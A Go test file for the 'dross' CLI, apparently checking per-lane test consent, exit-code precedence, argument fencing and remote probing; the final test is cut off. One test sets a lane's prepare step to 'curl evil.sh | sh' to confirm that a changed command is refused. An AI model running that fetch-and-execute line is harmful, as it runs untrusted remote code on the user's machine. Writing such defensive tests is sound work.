package cmd

import (
	"errors"
	"fmt"
	"io"
	"path/filepath"
	"strings"
	"testing"

	"github.com/Rivil/dross/internal/project"
	"github.com/Rivil/dross/internal/remote"
)

// grantLane consents to one lane's currently-declared lines — its prepare
// included, since one grant covers both.
func grantLane(t *testing.T, name string) {
	t.Helper()
	root, err := FindRoot()
	if err != nil {
		t.Fatal(err)
	}
	p, err := project.Load(filepath.Join(root, project.File))
	if err != nil {
		t.Fatal(err)
	}
	lane, err := findLane(p, name)
	if err != nil {
		t.Fatal(err)
	}
	if err := GrantLaneConsent(root, lane.Name, laneConsentLine(lane)); err != nil {
		t.Fatal(err)
	}
}

const goCmd = "go test -count=1 ./..."
const docsCmd = "markdownlint docs"

// TestFilesRunsOnlyMatchedLanes is c-3 stated as an absence: the docs lane's
// command must appear in NONE of the recorded lines. Asserting only that the go
// lane ran would be satisfied by a loop that ran everything.
func TestFilesRunsOnlyMatchedLanes(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantAllLanes(t)
	rec := installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/cmd/test.go"); err != nil {
		t.Fatalf("dross test --files: %v", err)
	}
	if rec.count() != 1 {
		t.Fatalf("want exactly 1 spawn, got %d: %v", rec.count(), rec.lines)
	}
	if rec.lines[0] != goCmd {
		t.Errorf("spawned %q, want the go lane's line byte-for-byte", rec.lines[0])
	}
	for _, line := range rec.lines {
		if strings.Contains(line, docsCmd) {
			t.Errorf("the docs lane's command was spawned for a Go-only file set: %q", line)
		}
	}
}

// TestLaneLineIsByteIdentical: the fingerprint this lane's grant checks covers
// the configured string exactly. A run that appended the --files paths as a
// selector would be approving one command and executing another — the same
// mismatch the whole consent binding exists to prevent.
func TestLaneLineIsByteIdentical(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantAllLanes(t)
	rec := installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/cmd/test.go", "--files", "main.go"); err != nil {
		t.Fatal(err)
	}
	if rec.count() != 1 || rec.lines[0] != goCmd {
		t.Fatalf("spawned %v, want exactly [%q]", rec.lines, goCmd)
	}
}

// TestLaneHeaderPrecedesLaneOutput is c-4: the header has to come BEFORE the
// lane's own output, or a transcript cannot attribute a result to the runner
// that produced it — which is the one thing the header is for.
func TestLaneHeaderPrecedesLaneOutput(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantAllLanes(t)

	// A spawn seam that writes a sentinel where the lane's output would go.
	orig := spawnLocal
	t.Cleanup(func() { spawnLocal = orig })
	spawnLocal = func(_, _ string, stdout io.Writer, _ io.Writer) error {
		_, _ = io.WriteString(stdout, "LANE-OUTPUT-SENTINEL\n")
		return nil
	}

	var out string
	if err := runCmdCapturing(t, &out, Test(), "--files", "internal/cmd/test.go"); err != nil {
		t.Fatal(err)
	}
	header := strings.Index(out, "lane go: "+goCmd)
	sentinel := strings.Index(out, "LANE-OUTPUT-SENTINEL")
	if header < 0 {
		t.Fatalf("no lane header in the transcript:\n%s", out)
	}
	if sentinel < 0 {
		t.Fatalf("the lane's output is missing:\n%s", out)
	}
	if header >= sentinel {
		t.Errorf("the header trails the lane's output — the transcript cannot attribute the result:\n%s", out)
	}
}

// TestUngrantedLaneRefusesOnlyItself is the locked lane_consent decision at the
// run site: one ungranted lane must not block the lanes that ARE granted, and
// must not run either. The exit code says a lane was refused, not that the code
// is broken.
func TestUngrantedLaneRefusesOnlyItself(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantLane(t, "go")
	rec := installSpawnRecorder(t, nil)

	var out string
	err := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
	if err == nil {
		t.Fatal("a run with an ungranted lane reported success")
	}
	if got := ExitCode(err); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d (lane refused)", got, exitLaneRefused)
	}
	if rec.count() != 1 || rec.lines[0] != goCmd {
		t.Fatalf("spawned %v, want only the granted lane's line", rec.lines)
	}
	if !strings.Contains(out, "docs") {
		t.Errorf("the refusal does not name the ungranted lane:\n%s", out)
	}
}

// TestStaleLaneRefusalIsDistinct: a lane whose command was REWRITTEN since it
// was trusted is the case the binding exists for. Reported as a routine first
// run, it reads as "you have not got round to trusting this yet" rather than
// "this line is not the line you approved".
func TestStaleLaneRefusalIsDistinct(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	root, err := FindRoot()
	if err != nil {
		t.Fatal(err)
	}
	// Granted for a command the lane no longer declares.
	if err := GrantLaneConsent(root, "go", "go test -race ./..."); err != nil {
		t.Fatal(err)
	}
	rec := installSpawnRecorder(t, nil)

	var out string
	rerr := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go")
	if rerr == nil {
		t.Fatal("a stale lane ran")
	}
	if !strings.Contains(out, "CHANGED") {
		t.Errorf("the stale refusal is indistinguishable from a first run:\n%s", out)
	}
	if rec.count() != 0 {
		t.Errorf("the stale lane spawned %d command(s)", rec.count())
	}
}

// TestAllLanesRefusedIsNotGreen: a run where nothing was allowed to execute
// measured exactly as much as one that matched nothing. Exiting 0 there is the
// false-green the whole exit-code contract exists to prevent.
func TestAllLanesRefusedIsNotGreen(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	rec := installSpawnRecorder(t, nil)

	err := runCmd(t, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
	if err == nil {
		t.Fatal("a run where every lane was refused reported success")
	}
	if got := ExitCode(err); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d", got, exitLaneRefused)
	}
	if rec.count() != 0 {
		t.Errorf("a fully-refused run spawned %d command(s)", rec.count())
	}
}

// TestRedLaneFailsTheRunAndRunsTheRest is the locked multi_lane decision: every
// matched lane runs, and a red result anywhere fails the gate. Stopping at the
// first red would hide the second lane's state; letting the second lane's green
// win would hide the first lane's failure.
func TestRedLaneFailsTheRunAndRunsTheRest(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantAllLanes(t)

	// The first lane in declaration order goes red; the second is fine.
	var lines []string
	orig := spawnLocal
	t.Cleanup(func() { spawnLocal = orig })
	spawnLocal = func(_, line string, _, _ io.Writer) error {
		lines = append(lines, line)
		if line == goCmd {
			return errors.New("exit status 1")
		}
		return nil
	}

	// A file set hitting both lanes.
	err := runCmd(t, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
	if err == nil {
		t.Fatal("a red lane did not fail the run")
	}
	if got := ExitCode(err); got != exitSuiteFailed {
		t.Errorf("exit = %d, want %d (red suite)", got, exitSuiteFailed)
	}
	if len(lines) != 2 {
		t.Fatalf("ran %v, want both lanes despite the first going red", lines)
	}
	if lines[0] != goCmd || lines[1] != docsCmd {
		t.Errorf("lanes ran out of declaration order: %v", lines)
	}
}

// TestRedBeatsRefusedInExitPrecedence: with a broken suite AND an ungranted
// lane, the run must report the broken suite. Reporting the consent problem
// would send the user to `dross trust --lane`, after which the run goes red for
// the first time and they have learnt nothing they could not have known now.
func TestRedBeatsRefusedInExitPrecedence(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantLane(t, "go") // docs stays ungranted
	installSpawnRecorder(t, errors.New("exit status 1"))

	err := runCmd(t, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
	if err == nil {
		t.Fatal("a red lane alongside a refused one reported success")
	}
	if got := ExitCode(err); got != exitSuiteFailed {
		t.Errorf("exit = %d, want %d (red), not %d (refused)", got, exitSuiteFailed, exitLaneRefused)
	}
}

// TestExitPrecedenceIsTotal drives every co-occurring pair through one table
// rather than sampling three of them, so "worst outcome wins" is pinned as an
// order instead of inferred from examples.
//
// The order — transport > partial > prepare > red > refused > nothing-measured
// — is about how badly each outcome misleads a caller deciding whether to
// commit, not about how annoying it is.
func TestExitPrecedenceIsTotal(t *testing.T) {
	order := []int{exitTransport, exitPartial, exitPrepareFailed, exitSuiteFailed, exitLaneRefused, exitNothingMeasured}
	tagged := func(code int) error {
		return &ExitCodeError{Code: code, Err: errors.New("outcome")}
	}
	for i, worse := range order {
		// Success loses to every failure, in both argument positions.
		if got := ExitCode(worseOutcome(nil, tagged(worse))); got != worse {
			t.Errorf("worseOutcome(nil, %d) = %d", worse, got)
		}
		if got := ExitCode(worseOutcome(tagged(worse), nil)); got != worse {
			t.Errorf("worseOutcome(%d, nil) = %d", worse, got)
		}
		for _, weaker := range order[i+1:] {
			if got := ExitCode(worseOutcome(tagged(worse), tagged(weaker))); got != worse {
				t.Errorf("worseOutcome(%d, %d) = %d, want %d", worse, weaker, got, worse)
			}
			// Order of arrival must not change the verdict: lanes run in
			// declaration order, and a lane's position in project.toml is
			// not an argument about what the run means.
			if got := ExitCode(worseOutcome(tagged(weaker), tagged(worse))); got != worse {
				t.Errorf("worseOutcome(%d, %d) = %d, want %d", weaker, worse, got, worse)
			}
		}
	}
	if worseOutcome(nil, nil) != nil {
		t.Error("two successes must stay a success")
	}
}

// TestPrepareOutranksRedAndUnderranksPartial asserts the ranks THEMSELVES, not
// just the pairwise verdicts above.
//
// exitRank's unknown-code default is literally `return 3` — exitSuiteFailed's
// own rank. A code left out of the switch therefore does not rank low, it TIES
// with a red suite, and worseOutcome resolves a tie to whichever error arrived
// first. That is order-dependent and silent: the pairwise table can pass while
// the rank is only accidentally right. Reading the ranks catches the omission
// directly.
func TestPrepareOutranksRedAndUnderranksPartial(t *testing.T) {
	if exitRank(exitPrepareFailed) <= exitRank(exitSuiteFailed) {
		t.Errorf("rank(prepare)=%d must be strictly above rank(red)=%d — a bootstrap that failed measured nothing about the code",
			exitRank(exitPrepareFailed), exitRank(exitSuiteFailed))
	}
	if exitRank(exitPrepareFailed) >= exitRank(exitPartial) {
		t.Errorf("rank(prepare)=%d must be strictly below rank(partial)=%d — an incomplete tree invalidates every lane, a failed prepare only its own",
			exitRank(exitPrepareFailed), exitRank(exitPartial))
	}
}

// TestRedLaneWithNoPrepareStillExitsOne: exit 7 must be unreachable in a repo
// that declares no prepare. The new code is an addition to the taxonomy, not a
// re-tagging of the failures already in it — a red suite is still a red suite
// everywhere the feature is not in use, which is every repo written before
// this phase.
func TestRedLaneWithNoPrepareStillExitsOne(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantAllLanes(t)
	installSpawnRecorder(t, errors.New("exit status 1"))

	err := runCmd(t, Test(), "--files", "internal/a.go")
	if err == nil {
		t.Fatal("a red lane reported success")
	}
	if got := ExitCode(err); got != exitSuiteFailed {
		t.Errorf("exit = %d, want %d (red suite) — a repo declaring no prepare can never produce %d",
			got, exitSuiteFailed, exitPrepareFailed)
	}
}

// TestLaneArgfenceBlamesTheLane: `sh` reads options before -c and honours no
// end-of-options token, so a command line starting with a dash would be taken
// as a shell option. The refusal has to name the lane key, because sending the
// user to edit runtime.test_command — a line that may be perfectly fine — is a
// fix applied to the wrong place.
func TestLaneArgfenceBlamesTheLane(t *testing.T) {
	filesFixture(t, `[[runtime.test_lane]]
name = "go"
match = ["internal/**"]
command = "-x go test ./..."`)
	grantAllLanes(t)
	rec := installSpawnRecorder(t, nil)

	err := runCmd(t, Test(), "--files", "internal/a.go")
	if err == nil {
		t.Fatal("a lane command beginning with a dash was accepted")
	}
	if !strings.Contains(err.Error(), "runtime.test_lane[go]") {
		t.Errorf("the fence refusal does not name the lane key: %v", err)
	}
	if strings.Contains(err.Error(), "runtime.test_command") {
		t.Errorf("the fence refusal blames runtime.test_command: %v", err)
	}
	if rec.count() != 0 {
		t.Errorf("the fenced lane spawned %d command(s)", rec.count())
	}
}

// TestArgfenceRefusesBeforeAnyLaneRuns: the fence is checked for every matched
// lane up front. Checked inside the loop, a malformed lane declared second
// would be discovered with the first lane already executed — and the fence
// exists precisely to stop a line reaching a shell.
func TestArgfenceRefusesBeforeAnyLaneRuns(t *testing.T) {
	filesFixture(t, `[[runtime.test_lane]]
name = "go"
match = ["internal/**"]
command = "go test ./..."

[[runtime.test_lane]]
name = "bad"
match = ["internal/**"]
command = "-x true"`)
	grantAllLanes(t)
	rec := installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/a.go"); err == nil {
		t.Fatal("a malformed lane was accepted")
	}
	if rec.count() != 0 {
		t.Errorf("the earlier lane ran before the fence refused: %v", rec.lines)
	}
}

// TestLanesOnlyRepoRunsWithNoTestCommand is the repo shape lanes most exist to
// serve. With the whole-suite gate stacked on top of the per-lane grants, this
// repo would refuse every lane run at a gate guarding a command it never
// spawns — so the per-lane check REPLACES it on this path rather than adding
// to it.
func TestLanesOnlyRepoRunsWithNoTestCommand(t *testing.T) {
	dir := laneFixture(t) // no runtime.test_command at all
	appendLanes(t, dir, goAndDocsLanes)
	grantAllLanes(t)
	rec := installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/a.go"); err != nil {
		t.Fatalf("a lanes-only repo must run its granted lanes: %v", err)
	}
	if rec.count() != 1 || rec.lines[0] != goCmd {
		t.Errorf("spawned %v, want the go lane", rec.lines)
	}
}

// TestBareTestStillRequiresTheWholeSuiteGrant is the other side of the same
// coin: moving the gate off the lane path must not move it off the bare path,
// where runtime.test_command is still what gets spawned.
func TestBareTestStillRequiresTheWholeSuiteGrant(t *testing.T) {
	dir := laneFixture(t)
	mustRunSet(t, "runtime.test_command", "go test ./...")
	appendLanes(t, dir, goAndDocsLanes)
	grantAllLanes(t) // lanes granted, the whole suite is NOT
	rec := installSpawnRecorder(t, nil)

	if err := runCmd(t, Test()); err == nil {
		t.Fatal("a bare `dross test` ran without the whole-suite grant")
	}
	if rec.count() != 0 {
		t.Errorf("the refusal spawned %d command(s)", rec.count())
	}
}

// TestDoctorConsentIsLaneAware: after lanes gained their own grants, "no
// runtime.test_command, so the loop commands refuse" is false in exactly the
// repo shape lanes serve. A doctor that kept saying it would send that user to
// configure something that is not broken.
func TestDoctorConsentIsLaneAware(t *testing.T) {
	dir := laneFixture(t) // no runtime.test_command
	appendLanes(t, dir, goAndDocsLanes)
	grantAllLanes(t)

	var out string
	_ = runCmdCapturing(t, &out, Doctor())
	if strings.Contains(out, "the loop commands refuse") {
		t.Errorf("doctor still claims the loop refuses in a lanes-only repo:\n%s", out)
	}
	if !strings.Contains(out, "--files") {
		t.Errorf("doctor does not say the lanes are still runnable:\n%s", out)
	}

	// A repo with no lanes keeps the original advice: there really is nothing
	// to run there.
	laneFixture(t)
	var bare string
	_ = runCmdCapturing(t, &bare, Doctor())
	if !strings.Contains(bare, "the loop commands refuse") {
		t.Errorf("a lane-less repo lost the original advice:\n%s", bare)
	}
}

// TestMultiLaneSyncsOnce: the tree is pushed once for the whole run, not once
// per lane. Fused, the wall-clock cost of lanes would scale with the number of
// lanes rather than with the code they cover — and a re-sync between lanes
// could push edits made while an earlier lane was running, so two lanes in one
// run would measure two different trees.
func TestMultiLaneSyncsOnce(t *testing.T) {
	root := grantedTestFixture(t, "go test ./...")
	appendLanes(t, filepath.Dir(root), goAndDocsLanes)
	grantAllLanes(t)
	rem := installRemoteRecorder(t, nil)
	local := installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/a.go", "--files", "docs/x.md"); err != nil {
		t.Fatalf("dross test --files: %v", err)
	}
	if n := local.count(); n != 0 {
		t.Errorf("%d lane(s) ran locally despite a granted host", n)
	}
	var rsyncs, sshs int
	for _, bin := range rem.bins() {
		switch {
		case strings.Contains(bin, "rsync"):
			rsyncs++
		case strings.Contains(bin, "ssh"):
			sshs++
		}
	}
	if rsyncs != 1 {
		t.Errorf("synced %d time(s), want exactly 1 for the whole run", rsyncs)
	}
	if sshs != 2 {
		t.Errorf("ran %d lane(s) over ssh, want 2", sshs)
	}
}

// TestRemoteLaneTransportFailureExitsThree: a host that died mid-run measured
// nothing, and a lane run reported as a red suite would send the user hunting a
// bug in code that was never tested. The lane path must classify the failure
// the same way the whole-suite path does.
func TestRemoteLaneTransportFailureExitsThree(t *testing.T) {
	root := grantedTestFixture(t, "go test ./...")
	appendLanes(t, filepath.Dir(root), goAndDocsLanes)
	grantAllLanes(t)

	// The sync lands; the far-side run does not come back.
	orig := spawnRemote
	t.Cleanup(func() { spawnRemote = orig })
	spawnRemote = func(argv []string, _ string, _, _ io.Writer) error {
		if len(argv) > 0 && strings.Contains(argv[0], "ssh") {
			return errors.New("connection closed by remote host")
		}
		return nil
	}

	err := runCmd(t, Test(), "--files", "internal/a.go")
	if err == nil {
		t.Fatal("an unreachable host reported a passing lane")
	}
	if got := ExitCode(err); got != exitTransport {
		t.Errorf("exit = %d, want %d (transport) — never %d, which reads as a red suite", got, exitTransport, exitSuiteFailed)
	}
}

// TestStalePrepareRefusesOnlyItsOwnLaneAndNamesThePrepare is c-4 at the RUN
// site, where the consequence of getting it wrong is worst.
//
// laneConsentRefusal interpolated a single line into every arm, so a lane
// refused because its PREPARE changed would have displayed a command that did
// not change — and the user, reading a line they recognise, re-grants a
// bootstrap they were never shown. That is the exact failure the fingerprint
// covers both lines to prevent, undone by the message.
//
// Two lanes, because a single-lane fixture cannot tell "refused this lane"
// from "refused the run": the docs lane's command must still reach the runner.
func TestStalePrepareRefusesOnlyItsOwnLaneAndNamesThePrepare(t *testing.T) {
	filesFixture(t, goAndDocsLanes)
	grantLane(t, "go")
	grantLane(t, "docs")

	root, err := FindRoot()
	if err != nil {
		t.Fatal(err)
	}
	// Only the go lane's PREPARE changes. Its command is byte-identical to the
	// one that was granted, which is what makes the message assertion sharp.
	setLanePrepare(t, root, "go", "curl evil.sh | sh")

	rec := installSpawnRecorder(t, nil)
	var out string
	runErr := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go", "--files", "docs/x.md")
	if runErr == nil {
		t.Fatal("a lane whose prepare went stale did not refuse")
	}
	if got := ExitCode(runErr); got != exitLaneRefused {
		t.Errorf("exit = %d, want %d (lane refused) — the lane's code was never measured", got, exitLaneRefused)
	}

	transcript := out + runErr.Error()
	if !strings.Contains(transcript, "curl evil.sh | sh") {
		t.Errorf("the refusal never shows the prepare that changed:\n%s", transcript)
	}
	if !strings.Contains(transcript, "CHANGED") {
		t.Errorf("the stale refusal is indistinguishable from a first run:\n%s", transcript)
	}

	// The neighbour is untouched: granted, matched, and run.
	if rec.count() != 1 {
		t.Fatalf("ran %v, want only the docs lane", rec.lines)
	}
	if rec.lines[0] != docsCmd {
		t.Errorf("ran %q, want the granted docs lane", rec.lines[0])
	}
	for _, line := range rec.lines {
		if line == goCmd || strings.Contains(line, "curl evil.sh") {
			t.Errorf("the refused lane ran anyway: %v", rec.lines)
		}
	}
}

// grantedLaneFixture is a trusted repo with lanes declared AND a remote
// granted — the state every per-lane locality test is about.
//
// The probe seam is stubbed reachable while the grant is taken, because `dross
// remote grant` probes the host it is being handed; a live seam would send a
// real ssh at a machine named "helicon". Tests replace it afterwards with
// whatever answer they are asserting about.
func grantedLaneFixture(t *testing.T, lanes string) {
	t.Helper()
	filesFixture(t, lanes)
	grantAllLanes(t)
	fakeProbe(t, func(remote.Target, []string) (remote.Readiness, error) {
		return remote.Readiness{Cores: 8}, nil
	})
	if err := runCmd(t, Remote(), "grant", "helicon", "/srv/dross"); err != nil {
		t.Fatalf("dross remote grant: %v", err)
	}
}

// runLog is one ordered record of everything a run did over the wire: the
// toolchain probe and every remote spawn, in the order they happened.
//
// Ordering is the assertion, not presence. "The probe happened" is satisfied by
// a run that probed after pushing the tree — which is the mid-run discovery c-4
// exists to prevent, with the transfer already paid for.
type runLog struct {
	events []string
	tools  [][]string
	probes int
}

// probeSeam installs a recording probe returning missing as the host's gap.
func (l *runLog) probeSeam(t *testing.T, missing []string, err error) {
	t.Helper()
	fakeProbe(t, func(_ remote.Target, tools []string) (remote.Readiness, error) {
		l.events = append(l.events, "probe")
		l.tools = append(l.tools, append([]string(nil), tools...))
		l.probes++
		if err != nil {
			return remote.Readiness{}, err
		}
		return remote.Readiness{Cores: 8, Missing: missing}, nil
	})
}

// spawnSeam installs a recording remote-spawn seam that names each leg.
func (l *runLog) spawnSeam(t *testing.T) {
	t.Helper()
	orig := spawnRemote
	t.Cleanup(func() { spawnRemote = orig })
	spawnRemote = func(argv []string, _ string, _, _ io.Writer) error {
		if len(argv) > 0 {
			l.events = append(l.events, argv[0])
		}
		return nil
	}
}

func (l *runLog) indexOf(event string) int {
	for i, e := range l.events {
		if e == event {
			return i
		}
	}
	return -1
}

// TestLaneRunProbesOnceWithTheUnion is c-4. One pass, for every matched lane,
// before anything spawns — a second probe is a second ssh round trip, and a
// per-lane probe is how a lane finds out mid-run.
func TestLaneRunProbesOnceWithTheUnion(t *testing.T) {
	grantedLaneFixture(t, `[[runtime.test_lane]]
name = "go"
match = ["internal/**"]
command = "go test -count=1 ./..."

[[runtime.test_lane]]
name = "web"
match = ["web/**"]
command = "pnpm test"`)
	log := &runLog{}
	log.probeSeam(t, nil, nil)
	log.spawnSeam(t)
	installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/a.go", "--files", "web/app.ts"); err != nil {
		t.Fatalf("dross test --files: %v", err)
	}
	if log.probes != 1 {
		t.Fatalf("the run probed %d times, want exactly 1 — each one is an ssh round trip", log.probes)
	}
	got := strings.Join(log.tools[0], " ")
	for _, want := range []string{"go", "pnpm"} {
		if !strings.Contains(got, want) {
			t.Errorf("the probe did not ask for %q: %v", want, log.tools[0])
		}
	}
}

// TestLaneRunDedupesTheProbedUnion: two lanes needing `go` must cost one
// `command -v go`. The probe asks the host once per entry, so a duplicated
// union doubles the wire cost of every multi-lane Go run.
func TestLaneRunDedupesTheProbedUnion(t *testing.T) {
	grantedLaneFixture(t, `[[runtime.test_lane]]
name = "go"
match = ["internal/**"]
command = "go test -count=1 ./..."

[[runtime.test_lane]]
name = "cmd"
match = ["main.go"]
command = "go test -count=1 ./internal/cmd/..."`)
	log := &runLog{}
	log.probeSeam(t, nil, nil)
	log.spawnSeam(t)
	installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/a.go", "--files", "main.go"); err != nil {
		t.Fatalf("dross test --files: %v", err)
	}
	n := 0
	for _, tool := range log.tools[0] {
		if tool == "go" {
			n++
		}
	}
	if n != 1 {
		t.Errorf("the probe asked for go %d times, want 1: %v", n, log.tools[0])
	}
}

// TestLaneProbePrecedesTheSync is c-4's second half, asserted BY INDEX. A probe
// that merely happened is satisfied by one issued after the tree was pushed —
// at which point a run where no lane can go remote has already paid for the
// transfer it was supposed to avoid.
func TestLaneProbePrecedesTheSync(t *testing.T) {
	grantedLaneFixture(t, goAndDocsLanes)
	log := &runLog{}
	log.probeSeam(t, nil, nil)
	log.spawnSeam(t)
	installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--files", "internal/a.go"); err != nil {
		t.Fatalf("dross test --files: %v", err)
	}
	probe, sync := log.indexOf("probe"), log.indexOf("rsync")
	if probe < 0 {
		t.Fatalf("the run never probed: %v", log.events)
	}
	if sync < 0 {
		t.Fatalf("the run never synced: %v", log.events)
	}
	if probe > sync {
		t.Errorf("the probe trails the transfer — the tree was pushed before the host was asked: %v", log.events)
	}
}

// TestUnreachableHostKeepsItsOwnWording is the c-5 split at the command. A host
// that never answered sends the whole run home with the transport line it has
// always printed, and no lane may claim a binary is absent from a machine that
// told us nothing.
func TestUnreachableHostKeepsItsOwnWording(t *testing.T) {
	grantedLaneFixture(t, goAndDocsLanes)
	log := &runLog{}
	log.probeSeam(t, nil, fmt.Errorf("dial: %w", remote.ErrTransport))
	log.spawnSeam(t)
	local := installSpawnRecorder(t, nil)

	var out string
	if err := runCmdCapturing(t, &out, Test(), "--files", "internal/a.go"); err != nil {
		t.Fatalf("an unreachable host must fall back, not fail: %v", err)
	}
	if !strings.Contains(out, "could not reach helicon") {
		t.Errorf("the transport fallback lost its wording:\n%s", out)
	}
	if strings.Contains(out, "fallback:") {
		t.Errorf("a lane blamed a toolchain on a host that was never reached:\n%s", out)
	}
	if local.count() != 1 {
		t.Errorf("the run spawned %d local command(s), want 1 — the whole run comes home", local.count())
	}
}

// TestLocalFlagNeverProbesForLanes: --local is the escape for a remote that is
// down, so it must not wait on that remote to answer a toolchain question.
func TestLocalFlagNeverProbesForLanes(t *testing.T) {
	grantedLaneFixture(t, goAndDocsLanes)
	log := &runLog{}
	log.probeSeam(t, nil, nil)
	log.spawnSeam(t)
	installSpawnRecorder(t, nil)

	if err := runCmd(t, Test(), "--local", "--files", "internal/a.go"); err != nil {
		t.Fatalf("dross test --local --files: %v", err)
	}
	if log.probes != 0 {
		t.Errorf("--local opened %d probe(s) at the granted host", log.probes)
	}
}

// TestLaneLessRunProbesForNoTools: a repo that never declared a lane has no
// toolchain to derive, so the probe asks exactly what it asked before this
// feature existed. A widened question here would change the transcript of every
// repo that is not using lanes at all.
func TestLaneLessRunProbesForNoTools(t *testing.T) {
	grantedTestFixture(t, "go test -count=1 ./...")
	log := &runLog{}
	log.probeSeam(t, nil, nil)
	log.spawnSeam(t)
	installSpawnRecorder(t, nil)

	if err := runCmd(t, Test()); err != nil {
		t.Fatalf("dross test: %v", err)
	}
	if log.probes != 1 {
		t.Fatalf("the run probed %d times, want 1", log.probes)
	}
	if len(log.tools[0]) != 0 {
		t.Errorf("a lane-less run asked the host for %v, want nothing", log.tools[0])
	}
}

// --- selector template consent (c-2) ---

// templateLane is the lane every assertion below mutates one field of. It
// carries all four bound fields so a test can REMOVE one and see the
// fingerprint move, which is the direction a naive concatenation survives.
func templateLane() project.TestLane {
	return project.TestLane{
		Name:             "rust",
		Match:            []string{"crates/**"},
		Command:          "cargo test",
		Prepare:          "cargo build",
		Selector:         "dir",
		SelectorTemplate: "--package {path}",
		SelectorJoin:     "",
	}
}

// TestAddingASelectorTemplateStalesTheGrant is c-2's core claim. The template
// is arbitrary user text that lands on the spawned line, so a grant issued
// before it existed must not authorize it — the same rule that already stales a
// lane when a prepare appears.
func TestAddingASelectorTemplateStalesTheGrant(t *testing.T) {
	root, repoDir := laneGrantFixture(t)
	before := project.TestLane{Name: "rust", Command: "cargo test", Selector: "dir"}
	mustGrantLane(t, root, "rust", laneConsentLine(before))
	if got := laneState(t, root, repoDir, "rust", laneConsentLine(before)); got != ConsentGranted {
		t.Fatalf("the grant did not take: %v", got)
	}

	after := before
	after.SelectorTemplate = "--package {path}"
	if got := laneState(t, root, repoDir, "rust", laneConsentLine(after)); got != ConsentStale {
		t.Errorf("adding a selector_template reported %v, want stale", got)
	}
}

// TestChangingSelectorJoinAloneStalesTheGrant: the join is the difference
// between `-R 'a|b'` and `-R 'a&b'` — a different line reaching the runner with
// every other field identical. A fingerprint that did not move would run the
// second under a grant read for the first.
func TestChangingSelectorJoinAloneStalesTheGrant(t *testing.T) {
	root, repoDir := laneGrantFixture(t)
	before := project.TestLane{Name: "ctest", Command: "ctest", Selector: "path", SelectorTemplate: "-R {paths}", SelectorJoin: "|"}
	mustGrantLane(t, root, "ctest", laneConsentLine(before))

	after := before
	after.SelectorJoin = "&"
	if got := laneState(t, root, repoDir, "ctest", laneConsentLine(after)); got != ConsentStale {
		t.Errorf("changing selector_join alone reported %v, want stale", got)
	}

	// And removing it entirely, which is the shape a naive "join only when
	// non-empty" framing would collapse onto the no-join line.
	dropped := before
	dropped.SelectorJoin = ""
	if got := laneState(t, root, repoDir, "ctest", laneConsentLine(dropped)); got != ConsentStale {
		t.Errorf("dropping selector_join reported %v, want stale", got)
	}
}

// TestLaneWithNoTemplateKeepsItsPrePhaseConsentLine is the grant-preservation
// half, and it is the reason the new frame is gated rather than applied
// unconditionally: framing every lane would re-fingerprint every lane grant
// already written on every machine, staling them all over a document nobody
// edited.
//
// Asserted against the literal pre-phase strings rather than against
// laneConsentLine's own output, which would pass for any consistent rewrite.
func TestLaneWithNoTemplateKeepsItsPrePhaseConsentLine(t *testing.T) {
	bare := project.TestLane{Name: "go", Command: "go test ./..."}
	if got := laneConsentLine(bare); got != "go test ./..." {
		t.Errorf("a lane with no prepare and no template must fingerprint its bare command, got %q", got)
	}

	prepared := project.TestLane{Name: "go", Command: "go test ./...", Prepare: "make build"}
	want := fmt.Sprintf("%s%d\x00%s\x00%d\x00%s", laneFrame, len("make build"), "make build", len("go test ./..."), "go test ./...")
	if got := laneConsentLine(prepared); got != want {
		t.Errorf("a prepared lane with no template must keep its pre-phase framed line:\n got %q\nwant %q", got, want)
	}

	// A selector alone never bound to consent and must not start: it names a
	// shape, not a line, and every lane already declaring one would stale.
	scoped := bare
	scoped.Selector = "go-package"
	if got := laneConsentLine(scoped); got != laneConsentLine(bare) {
		t.Errorf("declaring a selector moved the consent line: %q", got)
	}
}

// TestTemplateAndPrepareNamespacesAreDisjoint is c-2's failure mode stated
// directly: if some prepared lane could be spelled to produce a templated
// lane's framed string, one lane's grant would authorize a line the user read
// nothing about.
//
// Both frames are searched over the same field content, so a collision would
// have to come from the framing rather than from the fixtures happening to
// differ.
func TestTemplateAndPrepareNamespacesAreDisjoint(t *testing.T) {
	// The field values are chosen to be adversarial rather than realistic:
	// both frame prefixes appear as ordinary field CONTENT, and "1\x001"
	// spells a length header, so a framing that could be spoofed from inside a
	// field would collide here.
	fields := []string{"", "a", "b", "--package {path}", laneFrame, laneTemplateFrame, "1\x001"}
	commands := []string{"a", "b", laneFrame + "x", laneTemplateFrame + "x"}

	seen := map[string]string{}
	pairs := 0
	for _, prepare := range fields {
		for _, command := range commands {
			for _, tmpl := range fields {
				for _, join := range fields {
					line := laneConsentLine(project.TestLane{
						Name: "l", Command: command, Prepare: prepare,
						SelectorTemplate: tmpl, SelectorJoin: join,
					})
					if line == "" {
						// A NUL-carrying field is un-grantable by design and
						// shares the empty line with every other such lane.
						continue
					}
					key := fmt.Sprintf("prepare=%q command=%q template=%q join=%q", prepare, command, tmpl, join)
					if prev, ok := seen[line]; ok {
						t.Errorf("two lanes share one consent line:\n  %s\n  %s\n  line %q", prev, key, line)
